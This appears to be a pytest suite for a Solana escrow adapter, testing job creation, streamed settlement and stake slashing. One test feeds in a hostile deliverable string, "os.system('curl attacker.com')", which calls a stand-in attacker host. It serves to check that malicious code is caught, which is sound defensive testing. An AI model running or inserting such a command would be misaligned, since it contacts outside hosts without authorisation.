"""
Verification and Simulation Test Suite for Solana Mainnet (Network 501).
Tests Squads v4 Ephemeral Keypair Session with Anchor Universal Escrow CPI.
Validates 0.4s finality, micro-payment streaming, and instant collateral slashing.
"""

import pytest
from app.solana_squads_adapter import (
    SolanaSquadsAnchorAdapter,
    SOLANA_ANCHOR_PROGRAM,
    SOLANA_TREASURY_PUBKEY
)


@pytest.fixture
def solana_adapter():
    return SolanaSquadsAnchorAdapter(program_id=SOLANA_ANCHOR_PROGRAM)


def test_solana_ephemeral_cpi_job_creation(solana_adapter):
    """Scenario 1: Creates an ephemeral escrow job via Anchor CPI instruction."""
    job_id = 90001
    creator = "CreAt0r11111111111111111111111111111111111"
    worker = "W0rkEr111111111111111111111111111111111111"
    amount_usdc = 100.0  # 100 USDC

    cpi_instruction = solana_adapter.create_ephemeral_escrow_cpi(
        job_id=job_id,
        creator_pubkey=creator,
        worker_pubkey=worker,
        amount_spl_usdc=amount_usdc,
        worker_stake_bps=1500  # 15% stake
    )

    assert cpi_instruction["program_id"] == SOLANA_ANCHOR_PROGRAM
    assert cpi_instruction["instruction"] == "initialize_job"
    assert cpi_instruction["data"]["job_id"] == job_id
    assert cpi_instruction["data"]["amount"] == 100 * 1_000_000
    assert cpi_instruction["data"]["worker_stake"] == 15 * 1_000_000
    assert cpi_instruction["finality_seconds"] == 0.4


def test_solana_0_4s_streaming_settlement(solana_adapter):
    """Scenario 2: Stream release with 0.4s finality when truth invariant passes."""
    job_id = 90002
    solana_adapter.create_ephemeral_escrow_cpi(
        job_id=job_id,
        creator_pubkey="CreAt0r...",
        worker_pubkey="W0rkEr...",
        amount_spl_usdc=50.0,
        worker_stake_bps=1000
    )

    deliverable = "{\"gpu_loss\": 0.012, \"hash\": \"0xabc123...\"}"
    settle_res = solana_adapter.verify_and_stream_settle(
        job_id=job_id,
        deliverable=deliverable,
        truth_invariant_passed=True,
        ed25519_signature="sig_ed25519_valid..."
    )

    assert settle_res["status"] == "SETTLED_0_4S"
    assert settle_res["action"] == "STREAM_RELEASE"
    assert settle_res["finality"] == "0.4s"
    assert settle_res["protocol_toll_lamports"] == int(50 * 1_000_000 * 25 / 10000)
    assert settle_res["worker_collateral_returned"] == int(50 * 1_000_000 * 1000 / 10000)


def test_solana_instant_slashing_on_malicious_code(solana_adapter):
    """Scenario 3: Instant forfeiture of worker stake upon malicious code attempt."""
    job_id = 90003
    solana_adapter.create_ephemeral_escrow_cpi(
        job_id=job_id,
        creator_pubkey="CreAt0r...",
        worker_pubkey="W0rkEr...",
        amount_spl_usdc=200.0,
        worker_stake_bps=2000  # 40 USDC stake
    )

    malicious_deliverable = "import os; os.system('curl attacker.com')"
    slash_res = solana_adapter.verify_and_stream_settle(
        job_id=job_id,
        deliverable=malicious_deliverable,
        truth_invariant_passed=True,  # Even if marked true, code check catches it
        ed25519_signature="sig_..."
    )

    assert slash_res["status"] == "SLASHED_INSTANT"
    assert slash_res["action"] == "FORFEIT_TO_TREASURY"
    assert slash_res["confiscated_stake_lamports"] == 40 * 1_000_000
    assert slash_res["treasury_pubkey"] == SOLANA_TREASURY_PUBKEY
    assert slash_res["finality"] == "0.4s"
